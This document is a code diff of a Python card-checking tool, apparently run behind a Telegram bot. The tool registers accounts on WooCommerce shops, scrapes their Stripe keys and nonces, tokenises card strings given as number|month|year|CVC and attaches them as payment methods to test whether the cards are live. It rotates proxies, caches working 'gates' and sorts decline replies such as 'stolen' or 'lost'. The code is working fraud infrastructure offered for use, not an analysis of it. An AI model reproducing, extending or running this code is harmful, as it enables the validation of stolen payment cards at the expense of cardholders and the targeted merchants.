@@ -9,6 +9,7 @@ import json
 import threading
 import os
 import logging
+from datetime import datetime
 
 try:
     import fcntl
@@ -31,22 +32,20 @@ logger = logging.getLogger(__name__)
 
 _HERE = os.path.dirname(os.path.abspath(__file__))
 
+
 # ============================================
 # GATE HUNTER
 # ============================================
-
 class GateHunterFixed:
     def __init__(self, cache_file: str = "working_gates.txt", expiry_minutes: int = 30):
         self.cache_file = os.path.join(_HERE, cache_file)
         self.expiry_minutes = expiry_minutes
         self.ua = UserAgent()
-
         self.found_patterns = {
             'stripe_key_pattern': None,
             'nonce_pattern': None,
             'setup_nonce_pattern': None,
         }
-
         self.working_payment_pattern = {
             'endpoint_url': None,
             'endpoint_desc': None,
@@ -55,19 +54,15 @@ class GateHunterFixed:
             'content_type': None,
             'content_desc': None,
         }
-
         self._session_cache = {}
         self._session_lock = threading.Lock()
         self._nonce_cache = {}
         self._nonce_lock = threading.Lock()
 
-    # ============================================================
-    # SESSIONS
-    # ============================================================
-    def create_new_session(self, proxy_dict: Optional[Dict] = None) -> requests.Session:
+    def create_new_session(self, proxy_dict=None):
         session = requests.Session()
         session.verify = False
-        if proxy_dict:                       # ← FIX: only update if proxy exists
+        if proxy_dict:
             session.proxies.update(proxy_dict)
         session.headers.update({
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
@@ -95,9 +90,6 @@ class GateHunterFixed:
     def _save_nonce_cache(self, domain, nonce):
         pass
 
-    # ============================================================
-    # GATE CACHE
-    # ============================================================
     def save_gate_details(self, domain, stripe_key, nonce, setup_nonce, cookies=None):
         try:
             cache_data = {}
@@ -109,7 +101,7 @@ class GateHunterFixed:
                         cache_data = {}
             cache_data[domain] = {
                 'stripe_key': stripe_key,
-                'timestamp': datetime_now(),
+                'timestamp': datetime.now().isoformat(),
                 'permanent': True,
                 'payment_pattern': self.working_payment_pattern.copy()
                     if self.working_payment_pattern['endpoint_url'] else None
@@ -134,9 +126,6 @@ class GateHunterFixed:
             return False
         return 'stripe_key' in gate_data
 
-    # ============================================================
-    # HTTP
-    # ============================================================
     def normalize_url(self, url):
         if not url.startswith(('http://', 'https://')):
             url = 'https://' + url
@@ -165,9 +154,6 @@ class GateHunterFixed:
         except Exception:
             return None
 
-    # ============================================================
-    # REGISTER
-    # ============================================================
     def register_user(self, session, domain, proxy_dict=None):
         base_url = self.normalize_url(domain)
         reg_url = f"{base_url}/my-account/"
@@ -215,9 +201,6 @@ class GateHunterFixed:
         except Exception as e:
             return False, f"Register error: {str(e)[:80]}"
 
-    # ============================================================
-    # PAYMENT PAGE SCRAPE
-    # ============================================================
     def get_payment_page_data(self, session, domain, use_cache=True):
         saved_pattern = None
         cached_stripe_key = None
@@ -297,9 +280,6 @@ class GateHunterFixed:
 
         return None, None, None, None
 
-    # ============================================================
-    # STRIPE PAYMENT METHOD
-    # ============================================================
     def create_stripe_payment_token(self, stripe_key, card_details, proxy_dict=None):
         try:
             headers = {
@@ -354,9 +334,6 @@ class GateHunterFixed:
         except Exception as e:
             return False, None, str(e)
 
-    # ============================================================
-    # CONFIRM SETUP INTENT
-    # ============================================================
     def confirm_setup_intent_with_saved_pattern(self, session, domain, payment_token,
                                                 nonce, pattern):
         base_url = self.normalize_url(domain)
@@ -462,17 +439,21 @@ class GateHunterFixed:
                         if is_json and isinstance(result, dict):
                             if result.get('success') is True or \
                                result.get('data', {}).get('status') == 'succeeded':
-                                ok = True; stop = True
+                                ok = True
+                                stop = True
                             elif 'error' in str(result).lower() and any(
                                 x in str(result).lower() for x in
                                 ['decline', 'card', 'cvv', 'expired', 'funds', 'security code']):
-                                ok = False; stop = True
+                                ok = False
+                                stop = True
                         else:
                             t = (r.text or "").lower()
                             if any(x in t for x in ['succeeded', 'success', 'confirmed']):
-                                ok = True; stop = True
+                                ok = True
+                                stop = True
                             elif any(x in t for x in ['decline', 'card', 'cvv', 'expired', 'funds']):
-                                ok = False; stop = True
+                                ok = False
+                                stop = True
 
                         if stop:
                             self.working_payment_pattern = {
@@ -488,9 +469,6 @@ class GateHunterFixed:
                         continue
         return False, {'error': 'All attempts failed'}
 
-    # ============================================================
-    # MAIN PROCESS
-    # ============================================================
     def process_single_gate(self, domain, ccx, proxy_dict=None, use_cache=True):
         start_time = time.time()
         saved_pattern = None
@@ -505,8 +483,7 @@ class GateHunterFixed:
             try:
                 n, mm, yy, cvc = ccx.strip().split("|")
             except Exception:
-                return {'status': 'ERROR', 'response': 'Invalid card format',
-                        'time': 0}
+                return {'status': 'ERROR', 'response': 'Invalid card format', 'time': 0}
 
             if len(yy) == 4:
                 yy = yy[2:]
@@ -525,14 +502,11 @@ class GateHunterFixed:
                                   cached_data.get('payment_pattern'))
             cached_stripe_key = cached_data.get('stripe_key') if cached_data else None
 
-            # ------------------------------------------------
-            # FAST PATH — cached pattern + cached key
-            # ------------------------------------------------
+            # FAST PATH
             if has_cached_pattern and cached_stripe_key:
                 saved_pattern = cached_data['payment_pattern']
                 session = self.create_new_session(proxy_dict)
 
-                # get nonce first
                 nonce = None
                 r = self.get_with_session(session,
                                           f"{base_url}/my-account/add-payment-method/",
@@ -570,9 +544,7 @@ class GateHunterFixed:
                     'time': elapsed
                 }
 
-            # ------------------------------------------------
-            # SLOW PATH — fresh session
-            # ------------------------------------------------
+            # SLOW PATH
             session = self.create_new_session(proxy_dict)
 
             home_response = self.get_with_session(session, base_url)
@@ -649,11 +621,6 @@ class GateHunterFixed:
         return response_text
 
 
-def datetime_now():
-    from datetime import datetime
-    return datetime.now().isoformat()
-
-
 # ============================================
 # SINGLE HUNTER INSTANCE
 # ============================================
@@ -661,12 +628,11 @@ hunter = GateHunterFixed(cache_file="working_gates.txt", expiry_minutes=30)
 
 
 # ============================================
-# SITE MANAGEMENT
+# SITES
 # ============================================
 HARDCODED_SITES = ["rubyatelier.com"]
 current_site_index = 0
 site_lock = threading.Lock()
-
 SITES_FILE = os.path.join(_HERE, "sites_config.json")
 
 
@@ -738,30 +704,12 @@ def get_next_site():
 
 
 # ============================================
-# PROXY MANAGEMENT
+# PROXIES
 # ============================================
 USER_PROXIES_FILE = os.path.join(_HERE, "user_proxies.json")
 PROXIES_TXT_FILE = os.path.join(_HERE, "proxies.txt")
 OWNER_ID = "8271950215"
 proxy_lock = threading.Lock()
-
-PROXY_FAIL_TRACKER = {}
-PROXY_FAIL_LOCK = threading.Lock()
-MAX_PROXY_FAILURES = 3
-
-
-def is_proxy_connection_error(error_str):
-    keywords = [
-        'proxyerror', 'proxy error', 'unable to connect to proxy',
-        'tunnel connection failed', 'cannot connect to proxy',
-        'connection refused', 'connecttimeout', 'proxyconnectionerror',
-        'socksproxyerror', '402 payment required', '407 proxy authentication',
-        'newconnectionerror'
-    ]
-    low = error_str.lower()
-    if 'read timed out' in low or 'readtimeout' in low:
-        return False
-    return any(k in low for k in keywords)
 
 
 def load_user_proxies():
@@ -835,14 +783,14 @@ def parse_proxy_from_bot(proxy_raw):
         if "@" in clean:
             at = clean.rfind("@")
             auth = clean[:at]
-            host = clean[at+1:]
+            host = clean[at + 1:]
             hp = host.split(":")
             if len(hp) >= 2:
                 ip, port = hp[0], hp[1]
             ci = auth.find(":")
             if ci > 0:
                 user = auth[:ci]
-                pw = auth[ci+1:]
+                pw = auth[ci + 1:]
         else:
             parts = clean.split(":")
             if len(parts) == 2:
@@ -922,7 +870,7 @@ def _get_all_premium_proxies(exclude_user=None):
 
 
 def get_proxy_for_request_global(chat_id=None):
-    # 1) owner proxies first
+    # 1) owner
     if str(chat_id) == OWNER_ID:
         p = get_user_proxy(chat_id)
         if p:
@@ -931,13 +879,13 @@ def get_proxy_for_request_global(chat_id=None):
         if prem:
             return random.choice(prem)
 
-    # 2) per-user
+    # 2) user
     if chat_id:
         p = get_user_proxy(chat_id)
         if p:
             return p
 
-    # 3) FALLBACK — global proxies.txt  ← NEW
+    # 3) proxies.txt fallback
     try:
         if os.path.exists(PROXIES_TXT_FILE):
             with open(PROXIES_TXT_FILE) as f:
@@ -973,11 +921,11 @@ def process_card_enhanced(domain, ccx, chat_id=None, use_registration=True,
     if not proxy:
         proxy = get_proxy_for_request(chat_id)
 
-    # If still no proxy — continue WITHOUT proxy (direct connection)
+    # If no proxy — go DIRECT (do not error)
     if proxy:
         proxy_dict = {'http': proxy['http'], 'https': proxy['https']}
     else:
-        proxy_dict = None    # ← FIX: no more "No proxy available" error
+        proxy_dict = None
 
     result = hunter.process_single_gate(domain, ccx, proxy_dict, use_cache=True)
     raw_response = result.get('response', 'Unknown')
@@ -1022,14 +970,22 @@ def _clean_response(raw, status):
             low = raw.lower()
             if status == 'APPROVED' or 'succeeded' in low or 'success' in low:
                 return "Card added successfully 💯"
-            if 'decline' in low: return "Your card was declined."
-            if 'insufficient' in low: return "Insufficient funds."
-            if 'expired' in low: return "Your card has expired."
-            if 'incorrect' in low and 'cvc' in low: return "Incorrect CVC."
-            if 'security code' in low: return "Incorrect security code."
-            if 'lost' in low: return "Card reported lost."
-            if 'stolen' in low: return "Card reported stolen."
-            if 'processing' in low: return "Processing error, try again."
+            if 'decline' in low:
+                return "Your card was declined."
+            if 'insufficient' in low:
+                return "Insufficient funds."
+            if 'expired' in low:
+                return "Your card has expired."
+            if 'incorrect' in low and 'cvc' in low:
+                return "Incorrect CVC."
+            if 'security code' in low:
+                return "Incorrect security code."
+            if 'lost' in low:
+                return "Card reported lost."
+            if 'stolen' in low:
+                return "Card reported stolen."
+            if 'processing' in low:
+                return "Processing error, try again."
             if '3d' in low or 'authentication' in low:
                 return "3D Secure authentication required."
         return raw if raw else "Unknown error"
@@ -1037,9 +993,6 @@ def _clean_response(raw, status):
         return raw if raw else "Unknown error"
 
 
-# ============================================
-# SITE CHECK
-# ============================================
 def check_site_status(domain, chat_id=None, received_proxy=None):
     domain = domain.replace('https://', '').replace('http://', '').split('/')[0].strip()
     proxy = None
